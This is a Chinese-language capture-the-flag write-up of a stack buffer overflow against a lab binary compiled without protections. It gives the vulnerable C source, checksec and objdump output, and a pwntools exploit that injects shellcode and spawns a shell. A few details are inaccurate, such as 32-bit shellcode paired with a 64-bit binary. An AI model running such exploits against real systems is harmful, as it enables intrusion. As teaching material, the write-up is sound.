---
title: pwn-sniper-02
updated: 2024-02-22 14:41:48Z
created: 2023-05-05 02:30:47Z
---

**漏洞程序源码如下：**

```c
#include <stdio.h>
#include <unistd.h>

int main(){
        char buffer[0x50] = {0}; // 定义一个 0x50 = 80 个字节的字符数组 , 并全部初始化为 0 
        printf("&buffer = %p\n", &buffer); // 打印字符数组在内存(栈段)中的地址
        fflush(stdout); // 刷新缓冲区
        read(0, buffer, 0xFF); // 使用 read 函数将缓冲区中的 0xFF 字节长度的数据读取到 buffer 数组中 , 以换行符结束
        printf("Content of buffer : %s\n", buffer); // 打印 buffer 的值
        return 0; // 主函数返回
}
```

**编译选项如下：**

```c
a.out:hello.c
        gcc -g -fno-stack-protector -z execstack hello.c
clean:
        rm ./a.out
```

**checksec**

```
└─$ checksec --file=a.out
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified    Fortifiable      FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   75 Symbols        No    0            2a.out
```

**objdump**

```bash
└─$ objdump -t -j .text a.out 

a.out:     file format elf64-x86-64

SYMBOL TABLE:
0000000000400500 l    d  .text  0000000000000000              .text
0000000000400530 l     F .text  0000000000000000              deregister_tm_clones
0000000000400560 l     F .text  0000000000000000              register_tm_clones
00000000004005a0 l     F .text  0000000000000000              __do_global_dtors_aux
00000000004005c0 l     F .text  0000000000000000              frame_dummy
00000000004006e0 g     F .text  0000000000000002              __libc_csu_fini
0000000000400670 g     F .text  0000000000000065              __libc_csu_init
0000000000400500 g     F .text  000000000000002a              _start
00000000004005ed g     F .text  0000000000000077              main
```

**运行程序**

```bash
└─$ ./a.out 
&buffer = 0x7ffddf5e9f70
test
Content of buffer : test
```

**查看其反编译代码**

```c
undefined8 main(void)
{
    int64_t iVar1;
    undefined8 *puVar2;
    char buffer [80];
    
    // int main();
    puVar2 = (undefined8 *)buffer;
    for (iVar1 = 10; iVar1 != 0; iVar1 = iVar1 + -1) {
        *puVar2 = 0;
        puVar2 = puVar2 + 1;
    }
    printf("&buffer = %p\n", buffer);
    fflush(_stdout);
    read(0, buffer, 0xff);
    printf("Content of buffer : %s\n", buffer);
    return 0;
}
```

**分析如下，这个程序主要是将输入的数据从缓冲区复制给buffer变量，由于read并未限制读取，我们可以输入一段shellcode将其复制到buffer中，并在输入的shellcode后添加足够长度的数据使其可以覆盖到返回值，将返回值修改指向到buffer变量，从而可以执行我们写入的shellcode，示意图如下：**

**<img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/16b4fc6ffa60561271c4511a9606cf6c.png" alt="16b4fc6ffa60561271c4511a9606cf6c.png" width="566" height="428" class="jop-noMdConv">**

**buffer变量长度为80，ebp长度为8，长度一共为88**

```
>>> from pwn import *
>>> shellcode = asm(shellcraft.sh())
>>> print(shellcode)
b'jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80'
>>> len(shellcode)
44
```

**shellcode的长度为44,那么88-44=44,所以还需要44字节的填充数据**

**Exp如下：**

```python
from pwn import *

io = process('./a.out')

addr  = io.recvline(keepends=False)
addr  = addr[10:-1]
addr  = addr.decode()
addr = int(addr,16)

shellcode = asm(shellcraft.sh())

io.sendline(shellcode + b'a'*44 +p64(addr))
io.interactive()
```

![85fee530006bac3d1d7836fb8e48698d.png](https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/85fee530006bac3d1d7836fb8e48698d.png)